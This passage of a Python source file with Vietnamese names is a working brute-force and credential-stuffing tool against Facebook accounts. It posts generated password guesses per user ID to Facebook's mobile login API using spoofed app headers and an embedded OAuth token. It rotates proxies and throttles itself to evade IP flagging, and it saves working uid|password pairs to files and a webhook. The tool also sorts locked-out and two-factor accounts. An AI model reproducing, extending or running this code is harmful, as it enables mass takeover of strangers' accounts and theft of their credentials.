    "3": {"name": "SCAN KỸ LƯỠNG", "icon": "🎯", "color": C.GOLD,
          "min_workers": 60, "max_workers": 350, "default_workers": 150,
          "password_mode": "thorough",
          "desc": "Toàn bộ password Base + VN + Năm sinh"},
    "4": {"name": "SUPREME SCAN", "icon": "👑", "color": C.MAGENTA,
          "min_workers": 100, "max_workers": 500, "default_workers": 250,
          "password_mode": "supreme",
          "desc": "ALL password (Base+VN+UID+Năm sinh)"},
}


def dem_mat_khau_mode(mode, sample_uid="100009123456789"):
    try:
        return len(ChienLuocMatKhau.tao_danh_sach(sample_uid, mode))
    except Exception:
        return 0


class QuanLyProxy:
    GIAO_THUC = ("http://", "https://", "socks4://", "socks5://")

    def __init__(self, duong_dan_proxy):
        self.danh_sach = []
        self.da_chet = set()
        self.vi_tri = 0
        self._khoa = None
        if CONFIG["enable_proxy"] and Path(duong_dan_proxy).is_file():
            try:
                with open(duong_dan_proxy, encoding="utf-8") as f:
                    for dong in f:
                        dong = dong.strip()
                        if not dong or dong.startswith("#"):
                            continue
                        if not dong.startswith(self.GIAO_THUC):
                            dong = "http://" + dong
                        self.danh_sach.append(dong)
            except OSError as e:
                sys.stderr.write(
                    f"[Quản Lý Proxy] Không đọc {duong_dan_proxy}: {e}\n")

    def _lay_khoa(self):
        if self._khoa is None:
            self._khoa = asyncio.Lock()
        return self._khoa

    async def lay_proxy(self):
        if not self.danh_sach:
            return None
        async with self._lay_khoa():
            if len(self.da_chet) >= len(self.danh_sach):
                self.da_chet.clear()
            for _ in range(len(self.danh_sach)):
                p = self.danh_sach[self.vi_tri % len(self.danh_sach)]
                self.vi_tri += 1
                if p not in self.da_chet:
                    return p
            self.da_chet.clear()
            p = self.danh_sach[self.vi_tri % len(self.danh_sach)]
            self.vi_tri += 1
            return p

    async def danh_dau_chet(self, proxy):
        if proxy:
            async with self._lay_khoa():
                self.da_chet.add(proxy)


class ThongKe:
    """Thống kê — CP đếm theo cả UID-level và password-level."""

    def __init__(self):
        self.thoi_gian_bat_dau = time.time()
        self.da_thu = 0
        self.thanh_cong = 0
        # Password-level (debug)
        self.cp_that = 0
        self.cp_nghi_ngo = 0
        self.cp_gia = 0
        # UID-level (dùng để tính tỉ lệ)
        self.uid_cp_that = 0
        self.uid_cp_nghi = 0
        self.uid_cp_gia = 0
        self.hai_buoc = 0
        self.loi_request = 0
        self.loi_ghi_file = 0
        self.loi_uid = 0
        self.thu_lai = 0
        self.uid_da_xu_ly = 0
        self.uid_tong = 0
        self._vi_tri_xoay = 0
        self._lan_cap_nhat = 0.0
        self._da_canh_bao_flag = False
        self._da_abort = False

    def thoi_gian_chay(self):
        return max(1e-6, time.time() - self.thoi_gian_bat_dau)

    def toc_do(self):
        return self.da_thu / self.thoi_gian_chay()

    def toc_do_uid(self):
        return self.uid_da_xu_ly / self.thoi_gian_chay()

    def tong_loi(self):
        return self.loi_request + self.loi_ghi_file + self.loi_uid

    def ty_le_cp_nghi_ngo(self):
        """Tỉ lệ UID có CP (nghi ngờ + giả) trên tổng UID — chuẩn xác."""
        so_uid_cp = self.uid_cp_nghi + self.uid_cp_gia
        return so_uid_cp / max(1, self.uid_da_xu_ly)

    @property
    def chan(self):
        return self.cp_that

    def dong_trang_thai(self):
        self._vi_tri_xoay += 1
        lech = self._vi_tri_xoay
        xoay = SPINNER[self._vi_tri_xoay % len(SPINNER)]
        mau_xoay = RAINBOW[self._vi_tri_xoay % len(RAINBOW)]

        def mau(i):
            return RAINBOW[(i + lech) % len(RAINBOW)]

        return (
            f"{mau_xoay}{xoay}{C.R} "
            f"{mau(0)}{C.B}OK:{self.thanh_cong}{C.R}"
            f"{C.GRAY}|{C.R}"
            f"{mau(1)}{C.B}CPT:{self.uid_cp_that}{C.R}"
            f"{C.GRAY}|{C.R}"
            f"{mau(2)}{C.B}CP?:{self.uid_cp_nghi}{C.R}"
            f"{C.GRAY}|{C.R}"
            f"{mau(3)}{C.B}CPG:{self.uid_cp_gia}{C.R}"
            f"{C.GRAY}|{C.R}"
            f"{mau(4)}{C.B}UID:{self.uid_da_xu_ly}/"
            f"{self.uid_tong}{C.R}"
        )


class QuanLyGhiFile:
    LOAI = ("thanhcong", "cp_that", "cp_nghi_ngo", "cp_gia", "haibuoc")

    def __init__(self, thu_muc, nhan_series="series"):
        self.thu_muc = Path(thu_muc)
        try:
            self.thu_muc.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            sys.stderr.write(f"[Ghi File] Không tạo được {thu_muc}: {e}\n")
            self.thu_muc = _NHA
        self.thoi_gian = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        nhan_an_toan = re.sub(r'[^\w\-]', '_',
                               nhan_series.lower()).strip('_')
        self.nhan = nhan_an_toan or "series"
        self.tep = {}
        self._khoa = {}

    def _lay_khoa(self, f):
        if f not in self._khoa:
            self._khoa[f] = asyncio.Lock()
        return self._khoa[f]

    def _khoi_tao_tep(self):
        ten_loai = {
            "thanhcong": "thanhcong",
            "cp_that": "chan_that",
            "cp_nghi_ngo": "chan_nghi_ngo",
            "cp_gia": "chan_gia",
            "haibuoc": "haibuoc",
        }
        for loai in self.LOAI:
            self.tep[loai] = {
                "txt": self.thu_muc /
                       f"zin_{ten_loai[loai]}_{self.nhan}_"
                       f"{self.thoi_gian}.txt",
            }

    def chuan_bi(self):
        self._khoi_tao_tep()

    async def luu(self, loai, uid, mat_khau, trang_thai="thanhcong",
                  proxy=""):
        if loai not in self.tep:
            return
        nam = lay_nam_tai_khoan(uid)
        try:
            async with self._lay_khoa(self.tep[loai]["txt"]):
                async with aiofiles.open(self.tep[loai]["txt"], "a",
                                          encoding="utf-8") as f:
                    await f.write(f"{uid}|{mat_khau}|{nam}\n")
        except OSError as e:
            raise IOError(f"GhiFile.luu({loai}) thất bại: {e}")

    async def ket_thuc(self):
        return


class QuanLyTrangThai:
    SO_UID_TOI_DA_NHO = 200_000

    def __init__(self, duong_dan):
        self.duong_dan = Path(duong_dan)
        self.du_lieu = {"uid_cuoi": None, "da_kiem_tra": [], "series": ""}
        if CONFIG["enable_resume"] and self.duong_dan.is_file():
            try:
                with open(self.duong_dan, encoding="utf-8") as f:
                    da_doc = json.load(f)
                    if isinstance(da_doc, dict):
                        self.du_lieu.update(da_doc)
            except (OSError, json.JSONDecodeError) as e:
                sys.stderr.write(f"[Trạng Thái] Bỏ qua file lỗi: {e}\n")
        self.tap_da_kiem_tra = set(self.du_lieu.get("da_kiem_tra", []))
        self._khoa_luu = None

    def _lay_khoa(self):
        if self._khoa_luu is None:
            self._khoa_luu = asyncio.Lock()
        return self._khoa_luu

    def da_kiem_tra(self, uid):
        return uid in self.tap_da_kiem_tra

    async def danh_dau(self, uid):
        self.tap_da_kiem_tra.add(uid)
        if len(self.tap_da_kiem_tra) > self.SO_UID_TOI_DA_NHO:
            giu = list(self.tap_da_kiem_tra)[
                -int(self.SO_UID_TOI_DA_NHO * 0.75):]
            self.tap_da_kiem_tra = set(giu)
        self.du_lieu["da_kiem_tra"] = list(self.tap_da_kiem_tra)
        self.du_lieu["uid_cuoi"] = uid

    async def luu(self):
        async with self._lay_khoa():
            try:
                self.duong_dan.parent.mkdir(parents=True, exist_ok=True)
            except OSError:
                pass
            noi_dung = json.dumps(self.du_lieu, ensure_ascii=False,
                                    indent=2)
            tep_tam = self.duong_dan.with_name(
                self.duong_dan.name + ".tmp")
            try:
                async with aiofiles.open(tep_tam, "w",
                                          encoding="utf-8") as f:
                    await f.write(noi_dung)
                try:
                    tep_tam.replace(self.duong_dan)
                    return
                except OSError:
                    pass
            except OSError:
                pass
            try:
                async with aiofiles.open(self.duong_dan, "w",
                                          encoding="utf-8") as f:
                    await f.write(noi_dung)
                try:
                    if tep_tam.exists():
                        tep_tam.unlink()
                except OSError:
                    pass
            except OSError:
                pass


DANH_SACH_UA = (
    'Dalvik/1.6.0 (Linux; U; Android 6.0.1; Nexus 6P Build/MMB29P) '
    '[FBAN/FB4A;FBAV/109.0.0.15.70;]',
    'Dalvik/2.1.0 (Linux; U; Android 11; SM-A125F Build/RP1A.200720.012) '
    '[FBAN/FB4A;FBAV/300.0.0.30.115;]',
    'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SP1A.210812.016) '
    '[FBAN/FB4A;FBAV/350.0.0.32.105;]',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 '
    'Chrome/120.0.0.0 Mobile',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    'Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/605.1.15 Safari/605.1.15',
)

DIA_CHI_API = "https://b-graph.facebook.com/auth/login"

TRANG_THAI_OK = "success"
TRANG_THAI_CHECKPOINT = "checkpoint"
TRANG_THAI_2FA = "2fa"
TRANG_THAI_SAI_MK = "wrong_pass"
TRANG_THAI_KHAC = "unknown"


def phan_loai_phan_hoi(phan_hoi):
    if not isinstance(phan_hoi, dict):
        return TRANG_THAI_KHAC
    if 'access_token' in phan_hoi:
        return TRANG_THAI_OK
    loi_obj = phan_hoi.get('error')
    if not isinstance(loi_obj, dict):
        return TRANG_THAI_KHAC
    ma_loi = loi_obj.get('code', 0) or 0
    subcode = loi_obj.get('error_subcode', 0) or 0
    tieu_de = str(loi_obj.get('error_user_title', '')).lower()
    thong_bao = str(loi_obj.get('message', '')).lower()
    user_msg = str(loi_obj.get('error_user_msg', '')).lower()
    loai_loi = str(loi_obj.get('type', '')).lower()

    if subcode in (1348131, 1348132):
        return TRANG_THAI_CHECKPOINT
    if 'checkpoint' in tieu_de:
        return TRANG_THAI_CHECKPOINT
    if 'confirm' in tieu_de and 'identity' in tieu_de:
        return TRANG_THAI_CHECKPOINT
    if 'disabled' in tieu_de or 'locked' in tieu_de:
        return TRANG_THAI_CHECKPOINT
    if 'suspended' in tieu_de:
        return TRANG_THAI_CHECKPOINT
    if 'your account has been' in user_msg:
        return TRANG_THAI_CHECKPOINT
    if 'we need to confirm' in user_msg:
        return TRANG_THAI_CHECKPOINT
    if 'account is locked' in user_msg:
        return TRANG_THAI_CHECKPOINT
    if 'account has been disabled' in user_msg:
        return TRANG_THAI_CHECKPOINT
    if loai_loi == 'oauthexception' and 'user_checkpointed' in user_msg:
        return TRANG_THAI_CHECKPOINT

    if ma_loi == 404829 or subcode in (1348162, 1348163):
        return TRANG_THAI_2FA
    if 'two-factor' in thong_bao or 'two_factor' in thong_bao:
        return TRANG_THAI_2FA
    if 'two factor' in thong_bao:
        return TRANG_THAI_2FA
    if 'login approval' in thong_bao:
        return TRANG_THAI_2FA
    if 'approvals_code' in user_msg:
        return TRANG_THAI_2FA

    return TRANG_THAI_SAI_MK


CP_THAT = "cp_that"
CP_GIA = "cp_gia"
CP_KHONG_RO = "cp_khong_ro"


def phan_loai_cp(phan_hoi):
    """STRICT — chỉ CP_THAT khi có bằng chứng cực mạnh."""
    if not isinstance(phan_hoi, dict):
        return CP_KHONG_RO
    loi_obj = phan_hoi.get('error')
    if not isinstance(loi_obj, dict):
        return CP_KHONG_RO

    tieu_de = str(loi_obj.get('error_user_title', '')).lower()
    thong_bao = str(loi_obj.get('message', '')).lower()
    user_msg = str(loi_obj.get('error_user_msg', '')).lower()

    # BC cực mạnh #1: URL checkpoint riêng
    if loi_obj.get('checkpoint_url', ''):
        return CP_THAT

    # BC cực mạnh #2: text đặc trưng trong user_title
    for tk in ('we suspended your account',
               'your account has been locked',
               'your account has been disabled',
               'tài khoản của bạn đã bị khóa',
               'tài khoản đã bị vô hiệu hóa',
               'confirm your identity',
               'xác nhận danh tính'):
        if tk in tieu_de:
            return CP_THAT

    # BC cực mạnh #3: text đặc trưng trong user_msg
    for tk in ('your account has been locked',
               'your account has been disabled',
               'we suspended your account',
               'confirm your identity to continue',
               'we need to confirm your identity',
               'tài khoản của bạn đã bị khóa',
               'xác nhận danh tính'):
        if tk in user_msg:
            return CP_THAT

    # CP giả: chỉ có www.facebook.com generic
    if 'www.facebook.com' in thong_bao and not tieu_de and not user_msg:
        return CP_GIA
    if 'www.facebook.com' in user_msg and not tieu_de:
        return CP_GIA

    return CP_KHONG_RO


class BoKiemTra:
    def __init__(self, quan_ly_proxy, thong_ke, ghi_file, trang_thai,
                 mode="supreme"):
        self.quan_ly_proxy = quan_ly_proxy
        self.thong_ke = thong_ke
        self.ghi_file = ghi_file
        self.trang_thai = trang_thai
        self.mode = mode
        self.gioi_han = asyncio.Semaphore(CONFIG["concurrency"])
        self._khoa_toc_do = None
        self.lan_yeu_cau_cuoi = 0.0
        self.client = None
        self.tac_vu_webhook = set()
        self._cp_gan_day = []
        self._lan_cooldown = 0.0
        self._khoa_cp = None
        self._ds_ok = []
        self._khoa_ds_ok = None
        self._tap_uid_cp_gia = set()
        self._tap_uid_cp_nghi = set()

    def _lay_khoa_toc_do(self):
        if self._khoa_toc_do is None:
            self._khoa_toc_do = asyncio.Lock()
        return self._khoa_toc_do

    def _lay_khoa_cp(self):
        if self._khoa_cp is None:
            self._khoa_cp = asyncio.Lock()
        return self._khoa_cp

    def _lay_khoa_ds_ok(self):
        if self._khoa_ds_ok is None:
            self._khoa_ds_ok = asyncio.Lock()
        return self._khoa_ds_ok

    async def _check_cooldown(self):
        async with self._lay_khoa_cp():
            hien_tai = time.time()
            cua_so = CONFIG["cp_cua_so_giay"]
            self._cp_gan_day = [
                t for t in self._cp_gan_day if hien_tai - t < cua_so
            ][-30:]

            # Ngưỡng scale theo số UID đã xử lý
            n = self.thong_ke.uid_da_xu_ly
            nguong_scale = max(
                CONFIG["cp_so_luong_trigger"],
                min(30, int(n * 0.20))
            )

            if len(self._cp_gan_day) >= nguong_scale:
                if hien_tai - self._lan_cooldown > cua_so:
                    self._lan_cooldown = hien_tai
                    nghi = CONFIG["cp_cooldown_giay"]
                    sys.stderr.write(
                        f"\n[Cooldown] {len(self._cp_gan_day)} CP "
                        f">= {nguong_scale} trong {cua_so:.0f}s "
                        f"→ nghỉ {nghi:.0f}s\n")
                    await asyncio.sleep(nghi)

    def _ghi_nhan_cp(self):
        self._cp_gan_day.append(time.time())

    def _kiem_tra_flag(self):
        ts = self.thong_ke
        n = ts.uid_da_xu_ly
        if n < CONFIG["flag_canh_bao_min_uid"]:
            return "ok"
        ty_le = ts.ty_le_cp_nghi_ngo()

        if (n >= CONFIG["flag_abort_min_uid"]
                and ty_le >= CONFIG["flag_abort_ty_le"]
                and not ts._da_abort):
            ts._da_abort = True
            try:
                with _STDOUT_KHOA:
                    sys.stdout.write("\r" + " " * 44 + "\r")
                    sys.stdout.write(
                        f"\n\n  {C.RED}{C.B}"
                        f"╔══════════════════════════════════════════╗\n"
                        f"  ║  🚨 ABORT — IP BỊ FACEBOOK FLAG        ║\n"
                        f"  ╚══════════════════════════════════════════╝"
                        f"{C.R}\n"
                        f"  {C.WHITE}UID bị CP (nghi ngờ + giả){C.R} "
                        f"{C.GRAY}▸{C.R} "
                        f"{C.CRIMSON}{C.B}{ts.uid_cp_nghi + ts.uid_cp_gia}"
                        f"/{n} ({ty_le*100:.0f}%){C.R}\n"
                        f"  {C.WHITE}UID CP THẬT (đào được){C.R} "
                        f"{C.GRAY}▸{C.R} "
                        f"{C.GOLD}{C.B}{ts.uid_cp_that}{C.R}\n"
                        f"\n"
                        f"  {C.YELLOW}{C.B}→ Cách xử lý:{C.R}\n"
                        f"    {C.WHITE}1.{C.R} Dừng tool\n"
                        f"    {C.WHITE}2.{C.R} Đổi IP "
                        f"(WARP / Airplane 30s / Proxy)\n"
                        f"    {C.WHITE}3.{C.R} Chạy lại (workers 60-80)\n"
                        f"    {C.WHITE}4.{C.R} Vẫn bị → dải IP nhà mạng "
                        f"đã chặn, phải dùng proxy trả phí\n\n"
                    )
                    sys.stdout.flush()
            except OSError:
                pass
            if _STOP_EVENT is not None:
                _STOP_EVENT.set()
            return "abort"

        if (ty_le >= CONFIG["flag_canh_bao_ty_le"]
                and not ts._da_canh_bao_flag):
            ts._da_canh_bao_flag = True
            try:
                with _STDOUT_KHOA:
                    sys.stdout.write("\r" + " " * 44 + "\r")
                    sys.stdout.write(
                        f"\n  {C.YELLOW}{C.B}⚠️  CẢNH BÁO: "
                        f"IP có dấu hiệu bị flag{C.R}\n"
                        f"  {C.GRAY}▸ UID bị CP:{C.R} "
                        f"{C.CRIMSON}{ts.uid_cp_nghi + ts.uid_cp_gia}/"
                        f"{n} ({ty_le*100:.0f}%){C.R}\n"
                        f"  {C.GRAY}▸ Nếu vượt "
                        f"{int(CONFIG['flag_abort_ty_le']*100)}% "
                        f"tool sẽ tự dừng.{C.R}\n\n"
                    )
                    sys.stdout.flush()
            except OSError:
                pass
            return "canh_bao"

        return "ok"

    async def __aenter__(self):
        gioi_han_ket_noi = httpx.Limits(
            max_connections=CONFIG["concurrency"] + 50,
            max_keepalive_connections=CONFIG["concurrency"],
        )
        self.client = httpx.AsyncClient(
            timeout=CONFIG["timeout"],
            limits=gioi_han_ket_noi,
            verify=CONFIG["verify_tls"],
            follow_redirects=True,
            http2=False,
        )
        return self

    async def __aexit__(self, *args):
        for t in list(self.tac_vu_webhook):
            if not t.done():
                t.cancel()
        if self.tac_vu_webhook:
            await asyncio.gather(*self.tac_vu_webhook,
                                  return_exceptions=True)
        if self.client:
            try:
                await self.client.aclose()
            except Exception:
                pass

    async def _gioi_han_toc_do(self):
        if CONFIG["rate_limit"] <= 0:
            return
        async with self._lay_khoa_toc_do():
            hien_tai = time.time()
            khoang_toi_thieu = 1.0 / CONFIG["rate_limit"]
            khoang_cach = hien_tai - self.lan_yeu_cau_cuoi
            if khoang_cach < khoang_toi_thieu:
                await asyncio.sleep(khoang_toi_thieu - khoang_cach)
            self.lan_yeu_cau_cuoi = time.time()

    def _tao_yeu_cau(self, uid, mat_khau):
        du_lieu = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': mat_khau,
            'cpl': 'true',
            'credentials_type': 'device_based_login_password',
            'source': 'device_based_login',
            'error_detail_type': 'button_with_disabled',
            'format': 'json',
            'generate_session_cookies': '1',
            'generate_analytics_claim': '1',
            'generate_machine_id': '1',
            'family_device_id': str(uuid.uuid4()),
            'advertiser_id': str(uuid.uuid4()),
            'locale': 'en_US',
            'client_country_code': 'US',
            'device_id': str(uuid.uuid4()),
            'method': 'auth.login',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class':
                'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        tieu_de = {
            'content-type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'Authorization':
                'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': random.choice(DANH_SACH_UA),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-device-group': '5120',
            'x-fb-session-id':
                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid='
                + uuid.uuid4().hex,
            'x-fb-connection-bandwidth':
                str(random.randint(20000000, 30000000)),
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': uuid.uuid4().hex,
            'x-fb-friendly-name': 'ViewerReactionsMutation',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger',
        }
        return du_lieu, tieu_de

    def _tuy_chon_proxy(self, proxy):
        if not proxy:
            return {}
        if _HTTPX_PROXY_MOI:
            return {"proxy": proxy}
        return {"proxies": {"all://": proxy}}

    async def _mot_yeu_cau(self, uid, mat_khau, proxy=None):
        if CONFIG["dry_run"]:
            return {"_dry_run": True}, None
        du_lieu, tieu_de = self._tao_yeu_cau(uid, mat_khau)
        try:
            phan_hoi = await self.client.post(
                DIA_CHI_API, data=du_lieu, headers=tieu_de,
                **self._tuy_chon_proxy(proxy),
            )
            if phan_hoi.status_code >= 500:
                return None, f"http_{phan_hoi.status_code}"
            if phan_hoi.status_code == 429:
                return None, "http_429"
            try:
                return phan_hoi.json(), None
            except ValueError:
                return None, "invalid_json"
        except httpx.TimeoutException:
            return None, "timeout"
        except httpx.ProxyError:
            return None, "proxy_dead"
        except httpx.ConnectError:
            return None, "connect_error"
        except httpx.HTTPError as e:
            return None, f"http_{type(e).__name__}"
        except Exception as e:
            return None, f"err_{type(e).__name__}"

    async def _yeu_cau_co_thu_lai(self, uid, mat_khau, proxy=None):
        loi_cuoi = None
        for lan in range(CONFIG["max_retries"]):
            if lan > 0:
                self.thong_ke.thu_lai += 1
            phan_hoi, loi = await self._mot_yeu_cau(uid, mat_khau, proxy)
            if phan_hoi is not None:
                return phan_hoi, None, proxy
            loi_cuoi = loi
            if loi == "proxy_dead" and proxy:
                await self.quan_ly_proxy.danh_dau_chet(proxy)
                proxy = await self.quan_ly_proxy.lay_proxy()
            if loi in ("http_429", "http_503", "timeout"):
                cho = CONFIG["retry_backoff"] ** lan + random.uniform(0, 0.5)
                await asyncio.sleep(cho)
            else:
                break
        return None, loi_cuoi, proxy

    async def kiem_tra_tai_khoan(self, uid):
        try:
            await self._kiem_tra_noi_bo(uid)
        except asyncio.CancelledError:
            raise
        except IOError as e:
            self.thong_ke.loi_ghi_file += 1
            sys.stderr.write(f"[Kiểm Tra] LỖI GHI FILE uid={uid}: {e}\n")
        except Exception as e:
            self.thong_ke.loi_uid += 1
            sys.stderr.write(
                f"[Kiểm Tra] LỖI uid={uid}: "
                f"{type(e).__name__}: {e}\n")
        finally:
            self.thong_ke.uid_da_xu_ly += 1

    async def _kiem_tra_noi_bo(self, uid):
        if self.trang_thai is not None and self.trang_thai.da_kiem_tra(uid):
            return
        if self.trang_thai is not None:
            await self.trang_thai.danh_dau(uid)

        danh_sach = ChienLuocMatKhau.tao_danh_sach(uid, self.mode)
        proxy = await self.quan_ly_proxy.lay_proxy()

        so_cp_lien_tiep = 0
        nguong_cp = CONFIG["cp_nguong_xac_nhan"]

        for mat_khau in danh_sach:
            if _STOP_EVENT is not None and _STOP_EVENT.is_set():
                return
            async with self.gioi_han:
                await self._gioi_han_toc_do()
                phan_hoi, loi, proxy = await self._yeu_cau_co_thu_lai(
                    uid, mat_khau, proxy)

            self.thong_ke.da_thu += 1
            self._ve_trang_thai()

            if phan_hoi is None:
                self.thong_ke.loi_request += 1
                continue

            if CONFIG["dry_run"]:
                self._ve_thanh_cong(uid, mat_khau, proxy)
                if self.ghi_file is not None:
                    await self.ghi_file.luu("thanhcong", uid, mat_khau,
                                             "thanhcong", proxy)
                self.thong_ke.thanh_cong += 1
                break

            trang_thai = phan_loai_phan_hoi(phan_hoi)

            if trang_thai == TRANG_THAI_OK:
                self._ve_thanh_cong(uid, mat_khau, proxy)
                if self.ghi_file is not None:
                    await self.ghi_file.luu("thanhcong", uid, mat_khau,
                                             "thanhcong", proxy)
                self.thong_ke.thanh_cong += 1
                await self._bao_webhook("THÀNH CÔNG", uid, mat_khau,
                                         proxy)
                break

            if trang_thai == TRANG_THAI_CHECKPOINT:
                loai_cp = phan_loai_cp(phan_hoi)

                if loai_cp == CP_THAT:
                    self._ve_cp_that(uid, mat_khau, proxy)
                    if self.ghi_file is not None:
                        await self.ghi_file.luu(
                            "cp_that", uid, mat_khau, "cp_that", proxy)
                    self.thong_ke.cp_that += 1
                    self.thong_ke.uid_cp_that += 1
                    async with self._lay_khoa_ds_ok():
                        self._ds_ok.append((uid, mat_khau))
                    await self._bao_webhook(
                        "🎯 CP THẬT (đào được)", uid, mat_khau, proxy)
                    break

                # CP giả / không rõ → đếm password + UID (1 lần/UID)
                if loai_cp == CP_GIA:
                    if uid not in self._tap_uid_cp_gia:
                        self._tap_uid_cp_gia.add(uid)
                        self.thong_ke.uid_cp_gia += 1
                    self.thong_ke.cp_gia += 1
                    if self.ghi_file is not None:
                        await self.ghi_file.luu(
                            "cp_gia", uid, mat_khau, "cp_gia", proxy)
                else:
                    if uid not in self._tap_uid_cp_nghi:
                        self._tap_uid_cp_nghi.add(uid)
                        self.thong_ke.uid_cp_nghi += 1
                    self.thong_ke.cp_nghi_ngo += 1
                    if self.ghi_file is not None:
                        await self.ghi_file.luu(
                            "cp_nghi_ngo", uid, mat_khau,
                            "cp_nghi_ngo", proxy)

                so_cp_lien_tiep += 1
                if so_cp_lien_tiep >= nguong_cp:
                    self._ghi_nhan_cp()
                    await self._check_cooldown()
                    so_cp_lien_tiep = 0
                continue

            so_cp_lien_tiep = 0

            if trang_thai == TRANG_THAI_2FA:
                self._ve_hai_buoc(uid, mat_khau, proxy)
                if self.ghi_file is not None:
                    await self.ghi_file.luu("haibuoc", uid, mat_khau,
                                             "haibuoc", proxy)
                self.thong_ke.hai_buoc += 1
                await self._bao_webhook("HAI BƯỚC", uid, mat_khau,
                                         proxy)
                break

        if self.trang_thai is not None:
            if (self.thong_ke.uid_da_xu_ly % 50) == 0:
                await self.trang_thai.luu()

    async def _kiem_tra_1_cap(self, uid, mat_khau):
        proxy = await self.quan_ly_proxy.lay_proxy()
        try:
            async with self.gioi_han:
                await self._gioi_han_toc_do()
                phan_hoi, loi, proxy = await self._yeu_cau_co_thu_lai(
                    uid, mat_khau, proxy)
            self.thong_ke.da_thu += 1

            if phan_hoi is None:
                self.thong_ke.loi_request += 1
                self._ve_trang_thai()
                return "loi", proxy

            if CONFIG["dry_run"]:
                self.thong_ke.thanh_cong += 1
                self._ve_trang_thai()
                return "ok", proxy

            trang_thai = phan_loai_phan_hoi(phan_hoi)

            if trang_thai == TRANG_THAI_OK:
                self.thong_ke.thanh_cong += 1
                async with self._lay_khoa_ds_ok():
                    self._ds_ok.append((uid, mat_khau))
                self._in_ket_qua_mode8_ok(uid, mat_khau, proxy)
                await self._bao_webhook("THÀNH CÔNG", uid, mat_khau,
                                         proxy)
                self._ve_trang_thai()
                return "ok", proxy

            if trang_thai == TRANG_THAI_CHECKPOINT:
                loai_cp = phan_loai_cp(phan_hoi)
                if loai_cp == CP_THAT:
                    self.thong_ke.cp_that += 1
                    self.thong_ke.uid_cp_that += 1
                    async with self._lay_khoa_ds_ok():
                        self._ds_ok.append((uid, mat_khau))
                    self._in_ket_qua_cp_that(uid, mat_khau, proxy)
                    await self._bao_webhook(
                        "🎯 CP THẬT (đào được)", uid, mat_khau, proxy)
                    self._ve_trang_thai()
                    return "cp_that", proxy
                if loai_cp == CP_GIA:
                    if uid not in self._tap_uid_cp_gia:
                        self._tap_uid_cp_gia.add(uid)
                        self.thong_ke.uid_cp_gia += 1
                    self.thong_ke.cp_gia += 1
                else:
                    if uid not in self._tap_uid_cp_nghi:
                        self._tap_uid_cp_nghi.add(uid)
                        self.thong_ke.uid_cp_nghi += 1
                    self.thong_ke.cp_nghi_ngo += 1
                self._ve_trang_thai()
                return "cp_khong_ro", proxy

            if trang_thai == TRANG_THAI_2FA:
                self.thong_ke.hai_buoc += 1
                self._ve_trang_thai()
                return "2fa", proxy

            self._ve_trang_thai()
            return "sai", proxy
        finally:
            self.thong_ke.uid_da_xu_ly += 1

    def _in_ket_qua_mode8_ok(self, uid, mat_khau, proxy):
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + " " * 44 + "\r")
                vien = "═" * 42
                dong = [
                    f"  {C.GREEN}{C.B}╔{vien}╗{C.R}",
                    f"  {C.GREEN}{C.B}║{C.R} "
                    f"{mau_cau_vong('✅ LOG ĐƯỢC — TÀI KHOẢN CÒN NGUYÊN',
                                    palette=RAINBOW3)}",
                    f"  {C.GREEN}{C.B}║{C.R} {C.CYAN}UID     :{C.R} "
                    f"{C.WHITE}{C.B}{uid}{C.R}",
                    f"  {C.GREEN}{C.B}║{C.R} {C.YELLOW}PASSWORD:{C.R} "
                    f"{C.WHITE}{C.B}{mat_khau}{C.R}",
                    f"  {C.GREEN}{C.B}║{C.R} {C.GRAY}NĂM     :{C.R} "
                    f"{C.WHITE}{lay_nam_tai_khoan(uid)}{C.R}",
                ]
                if proxy:
                    dong.append(
                        f"  {C.GREEN}{C.B}║{C.R} {C.GRAY}PROXY   :{C.R} "
                        f"{C.WHITE}{proxy}{C.R}")
                dong.append(f"  {C.GREEN}{C.B}╚{vien}╝{C.R}")
                sys.stdout.write("\n".join(dong) + "\n")
                sys.stdout.flush()
        except OSError:
            pass
        try:
            sys.stdout.write('\a'); sys.stdout.flush()
        except OSError:
            pass

    def _in_ket_qua_cp_that(self, uid, mat_khau, proxy):
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + " " * 44 + "\r")
                vien = "═" * 42
                dong = [
                    f"  {C.GOLD}{C.B}╔{vien}╗{C.R}",
                    f"  {C.GOLD}{C.B}║{C.R} "
                    f"{mau_cau_vong('🎯 CP THẬT — ACC ĐÀO ĐƯỢC',
                                    palette=RAINBOW3)}",
                    f"  {C.GOLD}{C.B}║{C.R} {C.CYAN}UID     :{C.R} "
                    f"{C.WHITE}{C.B}{uid}{C.R}",
                    f"  {C.GOLD}{C.B}║{C.R} {C.YELLOW}PASSWORD:{C.R} "
                    f"{C.WHITE}{C.B}{mat_khau}{C.R}",
                    f"  {C.GOLD}{C.B}║{C.R} {C.GRAY}NĂM     :{C.R} "
                    f"{C.WHITE}{lay_nam_tai_khoan(uid)}{C.R}",
                ]
                if proxy:
                    dong.append(
                        f"  {C.GOLD}{C.B}║{C.R} {C.GRAY}PROXY   :{C.R} "
                        f"{C.WHITE}{proxy}{C.R}")
                dong.append(f"  {C.GOLD}{C.B}╚{vien}╝{C.R}")
                sys.stdout.write("\n".join(dong) + "\n")
                sys.stdout.flush()
        except OSError:
            pass
        try:
            sys.stdout.write('\a'); sys.stdout.flush()
        except OSError:
            pass

    def _ve_trang_thai(self):
        hien_tai = time.time()
